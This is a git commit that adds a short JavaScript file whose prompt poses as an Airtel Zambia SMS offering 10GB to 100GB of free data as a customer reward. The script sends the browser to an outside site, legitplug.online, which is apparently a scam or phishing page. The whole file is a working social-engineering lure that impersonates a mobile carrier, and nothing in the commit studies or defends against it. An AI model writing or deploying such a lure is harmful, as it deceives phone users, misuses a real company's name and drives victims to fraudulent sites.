bb61c13785e2f824b6a44d8934c673039b902c1e
dataviewz <gloliousam2@gmail.com>
2025-10-05 10:32:03 -0700

    Create activation-airtelzambiadata.js

---
+++ activation-airtelzambiadata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('AIRTEL SMS: Dear Customer, Kindly Check If your Airtel Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://legitplug.online/airtelzambiadata.html';
+}
